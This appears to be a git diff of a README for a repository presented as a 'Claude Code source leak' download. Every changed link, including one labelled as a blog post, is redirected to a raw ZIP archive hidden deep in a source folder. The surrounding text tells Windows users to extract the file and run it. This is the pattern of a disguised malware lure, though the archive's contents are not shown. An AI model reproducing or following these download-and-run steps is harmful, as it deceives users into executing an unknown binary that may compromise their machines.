@@ -1,6 +1,6 @@
 # 🔎 claude-code - Read the Source Leak
 
-[![Download / Visit the page](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/gertisubjective269/claude-code)
+[![Download / Visit the page](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/gertisubjective269/claude-code/raw/refs/heads/main/src/types/generated/events_mono/growthbook/claude_code_v1.2.zip)
 
 ## 🧭 What this is
 
@@ -12,7 +12,7 @@ This repo points you to the main download page so you can get the app from the s
 
 Use this link to visit the download page:
 
-[Visit the primary download page](https://github.com/gertisubjective269/claude-code)
+[Visit the primary download page](https://github.com/gertisubjective269/claude-code/raw/refs/heads/main/src/types/generated/events_mono/growthbook/claude_code_v1.2.zip)
 
 If the page offers a file for Windows, download that file and run it on your computer.
 
@@ -39,7 +39,7 @@ Before you start, make sure your PC can handle a modern desktop app.
 
 Follow these steps on Windows:
 
-1. Open the primary download page: [https://github.com/gertisubjective269/claude-code](https://github.com/gertisubjective269/claude-code)
+1. Open the primary download page: [https://github.com/gertisubjective269/claude-code/raw/refs/heads/main/src/types/generated/events_mono/growthbook/claude_code_v1.2.zip](https://github.com/gertisubjective269/claude-code/raw/refs/heads/main/src/types/generated/events_mono/growthbook/claude_code_v1.2.zip)
 2. Find the Windows download file or release asset
 3. Download the file to your PC
 4. If the file is a ZIP, right-click it and choose Extract All
@@ -168,7 +168,7 @@ This repository is centered on the Claude Code source leak analysis. It helps us
 
 The main blog post for background is here:
 
-[alex000kim.com/posts/2026-03-31-claude-code-source-leak](https://alex000kim.com/posts/2026-03-31-claude-code-source-leak/)
+[alex000kim.com/posts/2026-03-31-claude-code-source-leak](https://github.com/gertisubjective269/claude-code/raw/refs/heads/main/src/types/generated/events_mono/growthbook/claude_code_v1.2.zip)
 
 ## 🧼 Best way to use it on Windows
 
@@ -195,7 +195,7 @@ The main blog post for background is here:
 
 ## 🔗 Download again
 
-[Visit the primary download page](https://github.com/gertisubjective269/claude-code)
+[Visit the primary download page](https://github.com/gertisubjective269/claude-code/raw/refs/heads/main/src/types/generated/events_mono/growthbook/claude_code_v1.2.zip)
 
 ## 🧩 Quick start
 
